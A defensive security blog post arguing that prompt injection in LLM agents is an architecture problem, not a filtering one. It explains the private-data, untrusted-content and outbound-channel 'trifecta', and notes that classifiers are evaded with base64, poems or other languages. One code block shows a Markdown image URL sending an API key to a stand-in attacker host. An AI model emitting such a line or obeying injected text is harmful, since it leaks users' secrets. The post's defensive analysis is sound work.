---
layout: post
title:  "Prompt Injection Is Not a Filtering Problem"
date:   2026-08-03 10:15:00 -0300
categories: ai-security appsec
tags: [prompt-injection, llm, threat-modeling]
description: >-
  You cannot filter your way out of prompt injection. Break the lethal trifecta
  instead: private data, untrusted content, and a way to send data outward.
---
Every few weeks someone announces they have solved prompt injection with a
classifier that scores incoming text for maliciousness. Every few weeks someone
else gets past it with a base64 blob, a poem, or a sentence in Portuguese.

This will keep happening, because the framing is wrong. Prompt injection is not
spam that needs better filtering. It is the natural consequence of an
architecture where instructions and data travel in the same channel.

<!--more-->

## The actual mechanism

A model receives one flat sequence of tokens. Your system prompt, the user's
question, and the contents of a web page a tool just fetched all arrive with the
same status. There is no privileged bit that marks "this part is the program"
and "this part is the input."

SQL had this exact problem, and we solved it with parameterized queries — a
protocol-level separation between the statement and the values. No equivalent
exists for language models today, and delimiters do not create one. `<user_data>`
tags are a suggestion, not a boundary; the model can be talked out of respecting
them because respecting them was always a matter of persuasion.

> Detection sits at maybe 90-something percent. In application security, a
> control that fails a few percent of the time against an adversary who can
> retry for free is not a control. It is a speed bump.

## The lethal trifecta

Simon Willison's framing is the most useful I know, because it turns a fuzzy
model problem into a concrete architecture question. Damage requires three
ingredients together:

1. **Access to private data** — your inbox, your repo, your customer records.
2. **Exposure to untrusted content** — anything an attacker can put in front of
   the model: a web page, an issue comment, a PDF, an email.
3. **A channel to communicate outward** — an HTTP request, an email send, even a
   rendered Markdown image whose URL carries the payload.

Any two are survivable. All three, and a stranger's text is executing with your
privileges against your data.

The corollary is what makes it useful: **you do not need to win the argument
with the model.** You need to remove one leg. That is an engineering decision
you control completely, and it holds no matter how the injection is phrased.

## Removing a leg in practice

**Cut the exfiltration channel.** This is usually the cheapest leg to break and
the most commonly forgotten one. Data leaves through the strangest doors:

```markdown
<!-- Rendered in the chat UI. No click required. The URL is the exfil. -->
![](https://attacker.example/pixel.png?d=BASE64_OF_THE_API_KEY)
```

Allow-list the hosts your renderer will load images from, and the hosts your
agent's HTTP tool will connect to. An egress allow-list turns a full data breach
into a failed DNS lookup.

**Cut the private-data leg** by scoping the credential to the task instead of
the user. An agent summarizing public documentation does not need a token that
also reads billing. Issue narrow, short-lived credentials per session — the same
reasoning as the CI post, applied to a different runner.

**Cut the untrusted-content leg** by splitting agents. A planner that only ever
sees your instructions decides what to do; a quarantined worker with no secrets
and no network reads the hostile document and returns structured output. The
hostile text never enters the context that holds the privileges.

## What to do with the classifier

Keep it. Just be honest about its role: it raises the cost of a casual attack
and it generates signal for your logs. It is a detection layer on top of an
architecture that already fails safe — not the thing standing between a stranger
and your data.

The security question for an LLM feature is never "can this prompt be jailbroken."
Assume yes. The question is: **when the model does exactly what the attacker
asked, what can it actually reach?** If the answer is "public data and no
outbound network," you have built something safe out of a component you cannot
trust. That is ordinary engineering, and it is the whole job.
